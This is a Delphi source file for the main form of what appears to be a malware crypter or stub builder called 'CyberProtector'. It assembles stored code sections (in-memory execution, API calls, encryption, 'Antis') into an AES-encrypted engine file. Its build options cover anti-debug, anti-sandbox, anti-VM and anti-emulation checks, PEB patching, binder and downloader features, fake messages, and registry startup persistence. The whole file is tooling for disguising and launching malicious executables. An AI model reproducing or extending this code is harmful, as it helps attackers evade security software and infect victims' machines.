unit U_FrmMain;

interface
{$I Build.inc}

uses
  {$IFDEF DebugMode}codesitelogging,{$ENDIF}
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, bsSkinData, BusinessSkinForm, bsaadapter, bsSkinCtrls, bsSkinExCtrls,
  AdvMemo, AdvmPS, Menus, bsSkinMenus, rsStorage, rsAesEncryptor, rsBinData,
  PaxProgram, PaxCompiler,PaxInvoke,PaxRegister, StdCtrls, Mask, bsSkinBoxCtrls,
  bsSkinShellCtrls;

type
  TFrm_Main = class(TForm)
    SkinForm: TbsBusinessSkinForm;
    SkinData: TbsSkinData;
    SkinStore: TbsCompressedStoredSkin;
    skinadapter: TbsaSkinAdapter;
    CodeList: TbsSkinLinkBar;
    AdvPascalMemoStyler1: TAdvPascalMemoStyler;
    WorkingBox: TbsSkinGroupBox;
    ButtonGenerate: TbsSkinButton;
    CodePopUp: TbsSkinPopupMenu;
    Save: TMenuItem;
    BinData: TrsBinData;
    Encryptor: TrsAesEncryptor;
    storage: TrsStorage;
    bsSkinStdLabel1: TbsSkinStdLabel;
    Edit_UserID: TbsSkinEdit;
    Load: TMenuItem;
    opendialog: TbsOpenSkinDialog;
    btn_testengine: TbsSkinButton;
    PaxProgram1x: TPaxProgram;
    panelcode: TbsSkinPanel;
    CodeView: TAdvMemo;
    panelresult: TbsSkinPanel;
    resultview: TAdvMemo;
    procedure FormCreate(Sender: TObject);
    procedure CodeListClick(Sender: TObject);
    procedure SaveClick(Sender: TObject);
    procedure ButtonGenerateClick(Sender: TObject);
    procedure LoadClick(Sender: TObject);
    procedure btn_testengineClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Frm_Main: TFrm_Main;

implementation

{$R *.dfm}
uses
U_Utils,dsrAES,U_Chiper;

function BufferToHex(const Buf; BufSize : Cardinal) : string;
var
  I     : LongInt;
begin
  Result := '';
  for I := 0 to BufSize - 1 do
    Result := Result + IntToHex(TByteArray(Buf)[I], 2);              {!!.01}
end;

function ReplaceText(const S,ReplacePiece,ReplaceWith: String):String;
Var
Position: Integer;
TempStr: String;
begin
Position := Pos(ReplacePiece,S);
if Position > 0 then Begin
TempStr := S;
Delete(TempStr,1,Position-1+Length(ReplacePiece));
Result :=
Copy(S,1,Position-1)+ReplaceWith+ReplaceText(TempStr,ReplacePiece,ReplaceWith)
End else Result := S;
end;

procedure SaveEngine(filename,key:string;Stream:TStream);
var
i : integer;
Data: TrsBinData;
cryptor: TrsAesEncryptor;
xstorage: TrsStorage;
KeyEnc : TKey128;
begin
  GenerateMD5KeyA(KeyEnc,ansistring(key));
  key := BufferToHex(KeyEnc,length(KeyEnc));
  if fileexists(filename) then deletefile(filename);
  Data := TrsBinData.Create(nil);
  cryptor:= TrsAesEncryptor.Create(nil);
  xstorage:= TrsStorage.Create(nil);
  try
    Data.FileName := filename;
    Data.Options := [];
    cryptor.KeyBits := ck256;
    cryptor.EncryptAll := true;
    cryptor.Key := key;
    xstorage.Encryptor := cryptor;
    xstorage.StorageData := Data;
    xstorage.WriteString('Application','CyberProtector');
    xstorage.WriteInteger('Version',1);
    xstorage.WriteInteger('MinSupport',1);
    xstorage.WriteStream('Engine',Stream);
    xstorage.WriteInteger('JunkCount',length(garbageasm));
    for i := 0 to length(garbageasm) -1 do
    begin
      xstorage.WriteString('JunkCode'+inttostr(i),string(garbageasm[i]));
    end;
    xstorage.WriteInteger('PatternCount',2);
    xstorage.WriteString('Pattern0hex','4812248F8EEFDB1229D978E88558251237889D509C5707B6F14AF9E17EB28DCF85E97F7610BAFE872C10A820421B4A8EE8BF96F50F78E965BBA9C576FACFB7E7');
    xstorage.WriteString('Pattern0Name','CGServer1');
    xstorage.WriteString('Pattern1hex','55D0B884B94000E81CA0FFFFEB0CBA84B9400033C0E84E93FFFF8D45C8E8AACEFFFF8D45C8508D45');
    xstorage.WriteString('Pattern1Name','CGServer2');
    xstorage.Save;
  finally
    xstorage.Free;
    Data.Free;
    cryptor.Free;
  end;
end;

function LoadAndRunEngine(filename,key:string):string;
var
Data: TrsBinData;
cryptor: TrsAesEncryptor;
xstorage: TrsStorage;
Stream : TMemorystream;
HP:pointer;
BuildInfo : TBuildInfo;
MyProg: TPaxProgram;
KeyEnc : TKey128;
begin
  GenerateMD5KeyA(KeyEnc,ansistring(key));
  key := BufferToHex(KeyEnc,length(KeyEnc));
  Data := TrsBinData.Create(nil);
  cryptor:= TrsAesEncryptor.Create(nil);
  xstorage:= TrsStorage.Create(nil);
  Stream := TMemoryStream.Create;
  MyProg := TPaxProgram.Create(nil);
  try
    Data.FileName := filename;
    Data.Options := [];
    cryptor.KeyBits := ck256;
    cryptor.EncryptAll := true;
    cryptor.Key := key;
    xstorage.Encryptor := cryptor;
    xstorage.StorageData := Data;
    xstorage.Load;
    xstorage.ReadStream('Engine',Stream);
    Stream.Position := 0;
    MyProg.LoadFromStream(Stream);
    MyProg.RegisterMember(0, 'ExIntToHex', @ExIntToHex);
    MyProg.RegisterMember(0, 'CrcansiString', @CrcansiString);
    MyProg.RegisterMember(0, 'GetString', @GetString);
    MyProg.RegisterMember(0, 'JunkGenerator', @JunkGenerator);
    MyProg.RegisterMember(0, 'GetName', @GetName);
    MyProg.RegisterMember(0, 'RandomFunc', @RandomFunc);
    MyProg.MapLocal;
    MyProg.Run;
    HP := MyProg.GetAddress('Maincode');
    if assigned(HP) then
    begin
      BuildInfo.Debug := true;
      BuildInfo.CompressMethod := 2;
      BuildInfo.AntiDebug := true;
      buildinfo.AntiMonitor := true;
      buildinfo.AntiSandbox := true;
      buildinfo.AntiVM := true;
      buildinfo.AntiEmul := true;
      BuildInfo.EncKey := 'testing';
      BuildInfo.Cryptdata := 'testing';
      BuildInfo.EncryptionMethod := 0;
      BuildInfo.BufferMethod := 1;
      result := string(TMaincode(HP)(BuildInfo));
    end;
  finally
    xstorage.Free;
    Data.Free;
    cryptor.Free;
    Stream.Free;
    MyProg.Free;
  end;
end;

procedure TFrm_Main.btn_testengineClick(Sender: TObject);
begin
  panelresult.Visible := true;
  panelcode.Visible := false;
  resultview.lines.Clear;
  resultview.Lines.BeginUpdate;
  try
    resultview.Lines.Add(LoadAndRunEngine('Engine.bin',Edit_UserID.Text));
  finally
    resultview.Lines.EndUpdate;
  end;
end;

procedure TFrm_Main.ButtonGenerateClick(Sender: TObject);
var
  I,H_TBuildInfo: Integer;
  PaxCompiler1: TPaxCompiler;
  PaxPascalLanguage1: TPaxPascalLanguage;
  PaxProgram1: TPaxProgram;
  EStream : TMemoryStream;
  needcode : tstringlist;
  maincode : string;
begin
  PaxCompiler1 := TPaxCompiler.Create(nil);
  PaxPascalLanguage1 := TPaxPascalLanguage.Create(nil);
  PaxProgram1 := TPaxProgram.Create(nil);
  needcode := tstringlist.Create;
  try
    PaxCompiler1.RegisterLanguage(PaxPascalLanguage1);
    PaxCompiler1.RegisterHeader(0, 'function ExIntToHex(Value: Integer; Digits: Integer): ansistring;', @ExIntToHex);
    PaxCompiler1.RegisterHeader(0, 'Function CrcansiString(source:ansistring):longword;', @CrcansiString);
    PaxCompiler1.RegisterHeader(0, 'Function GetString(str:ansistring):ansistring;', @GetString);
    PaxCompiler1.RegisterHeader(0, 'function JunkGenerator:Ansistring;', @JunkGenerator);
    PaxCompiler1.RegisterHeader(0, 'function GetName(str:ansistring):ansistring;', @GetName);
    PaxCompiler1.RegisterHeader(0, 'Function RandomFunc(const temp:array of string):string;', @RandomFunc);
    H_TBuildInfo := PaxCompiler1.RegisterRecordType(0, 'TBuildInfo');
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'projectname', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'Debug', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'CompressMethod', _typeINTEGER);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'EncryptionMethod', _typeINTEGER);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'AntiDebug', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'AntiMonitor', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'AntiSandbox', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'AntiVM', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'AntiEmul', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'EncKey', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'Cryptdata', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'BufferMethod', _typeINTEGER);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'ResourceName', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'Restype', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'ResSplit', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'ActiveFakeM', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'MessageType', _typeINTEGER);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'MessageText', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'MessageCaption', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'MessageButton', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'PatchPeb', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'usepath', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'havebrowser', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'havedrop', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'havebinder', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'havedownloader', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'haveStartup', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'hklm', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'hklmkey', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'hkcu', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'hkcukey', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'Policies', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'Policieskey', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'Activex', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'Activexkey', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'ComponentID', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'Vesion', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'hardwareid', _typeCARDINAL);
    PaxCompiler1.AddModule('1', PaxPascalLanguage1.LanguageName);
    storage.RootSection := 'GenerateName';
    needcode.Add(storage['Code']);
    storage.RootSection := 'Misc';
    needcode.Add(storage['Code']);
    storage.RootSection := 'GlobalVariable';
    needcode.Add(storage['Code']);
    storage.RootSection := 'ApiCall';
    needcode.Add(storage['Code']);
    storage.RootSection := 'Encryption';
    needcode.Add(storage['Code']);
    storage.RootSection := 'ExecuteFromMem';
    needcode.Add(storage['Code']);
    storage.RootSection := 'Antis';
    needcode.Add(storage['Code']);
    storage.RootSection := 'RunMain';
    needcode.Add(storage['Code']);
    storage.RootSection := 'Main';
    maincode := storage['Code'];
    maincode := ReplaceText(maincode,'xxxxxxxxxxxxxxxxxx',Edit_UserID.Text);
    needcode.Add(maincode);
    PaxCompiler1.AddCode('1',needcode.Text);
    {$IFDEF DebugMode}
    codesite.Send('needcode',needcode);
    {$ENDIF}
    PaxCompiler1.AddCode('1','begin end.');
    if PaxCompiler1.Compile(PaxProgram1) then
    begin
      EStream := TMemoryStream.Create;
      try
        PaxProgram1.SaveToStream(EStream);
        EStream.Position := 0;
        SaveEngine('Engine.bin',Edit_UserID.Text,EStream);
      finally
        EStream.Free;
      end;
    end else
    begin
      for I:=0 to PaxCompiler1.ErrorCount - 1 do
      begin
        ShowMessage(format('Message %s, Line %s, Module %s, LineNumber %d, LinePos %d',[PaxCompiler1.ErrorMessage[i],PaxCompiler1.ErrorLine[i],
        PaxCompiler1.ErrorModuleName[i],PaxCompiler1.ErrorLineNumber[i],PaxCompiler1.ErrorLinePos[i]]));
      end;
    end;
  finally
    needcode.free;
    PaxCompiler1.Free;
    PaxPascalLanguage1.Free;
    PaxProgram1.Free;
  end;
end;

procedure TFrm_Main.CodeListClick(Sender: TObject);
var
code : string;
begin
  panelresult.Visible := false;
  panelcode.Visible := true;
  try
  CodeView.Lines.BeginUpdate;
  try
    try
      CodeView.Lines.Clear;
      storage.RootSection := CodeList.Items[codelist.ItemIndex].Caption;
      code := storage['Code'];
      CodeView.Lines.Add(code);
    Except
    end;
  finally
    CodeView.Lines.EndUpdate;
  end;
  Except
  end;
end;

procedure TFrm_Main.FormCreate(Sender: TObject);
var
i,y,GC,GI :integer;
begin
  //form
  if not storage.KeyExist('Form\CodeList\GroupCount') then
  storage.Writeinteger('Form\CodeList\GroupCount',2);
  if not storage.KeyExist('Form\CodeList\Group0\Name') then
  storage.WriteString('Form\CodeList\Group0\Name','MainCode');
  if not storage.KeyExist('Form\CodeList\Group0\ItemsCount') then
  storage.Writeinteger('Form\CodeList\Group0\ItemsCount',8);
  if not storage.KeyExist('Form\CodeList\Group0\Item0\Name') then
  storage.WriteString('Form\CodeList\Group0\Item0\Name','Main');
  if not storage.KeyExist('Form\CodeList\Group0\Item1\Name') then
  storage.WriteString('Form\CodeList\Group0\Item1\Name','GlobalVariable');
  if not storage.KeyExist('Form\CodeList\Group0\Item2\Name') then
  storage.WriteString('Form\CodeList\Group0\Item2\Name','ApiCall');
  if not storage.KeyExist('Form\CodeList\Group0\Item3\Name') then
  storage.WriteString('Form\CodeList\Group0\Item3\Name','Encryption');
  if not storage.KeyExist('Form\CodeList\Group0\Item4\Name') then
  storage.WriteString('Form\CodeList\Group0\Item4\Name','Misc');
  if not storage.KeyExist('Form\CodeList\Group0\Item5\Name') then
  storage.WriteString('Form\CodeList\Group0\Item5\Name','ExecuteFromMem');
  if not storage.KeyExist('Form\CodeList\Group0\Item6\Name') then
  storage.WriteString('Form\CodeList\Group0\Item6\Name','Antis');
  if not storage.KeyExist('Form\CodeList\Group0\Item7\Name') then
  storage.WriteString('Form\CodeList\Group0\Item7\Name','RunMain');
  if not storage.KeyExist('Form\CodeList\Group1\Name') then
  storage.WriteString('Form\CodeList\Group1\Name','UtilsCode');
  if not storage.KeyExist('Form\CodeList\Group1\ItemsCount') then
  storage.Writeinteger('Form\CodeList\Group1\ItemsCount',1);
  if not storage.KeyExist('Form\CodeList\Group1\Item0\Name') then
  storage.WriteString('Form\CodeList\Group1\Item0\Name','GenerateName');
  storage.RootSection := '';
  GC := storage.ReadInteger('Form\CodeList\GroupCount',0);
  if GC=0 then exit;
  for I := 0 to GC - 1 do
  begin
    with CodeList.Items.Add do
    begin
      caption :=  storage.Readstring('Form\CodeList\Group'+inttostr(i)+'\Name','');
      header := true;
    end;
    GI := storage.ReadInteger('Form\CodeList\Group'+inttostr(i)+'\ItemsCount',0);
    if GI<>0 then
    begin
      for Y := 0 to GI - 1 do
      begin
        with CodeList.Items.Add do
        begin
          caption :=  storage.Readstring('Form\CodeList\Group'+inttostr(i)+'\Item'+inttostr(y)+'\Name','');
          header := false;
        end;
      end;
    end;
  end;
end;

procedure TFrm_Main.LoadClick(Sender: TObject);
begin
  opendialog.Filter := 'Engine Files|*.txt;*.pas;*.dpr';
  opendialog.FileName := '';
  if opendialog.Execute Then
  begin
    if (opendialog.FileName <> '') and fileexists(opendialog.FileName) then
    begin
      CodeView.Lines.LoadFromFile(opendialog.FileName);
    end;
  end;
end;

procedure TFrm_Main.SaveClick(Sender: TObject);
var
code : string;
begin
  code := CodeView.Lines.Text;
  storage.RootSection := CodeList.Items[codelist.ItemIndex].Caption;
  storage['Code'] := code;
  storage.Save;
end;

end.
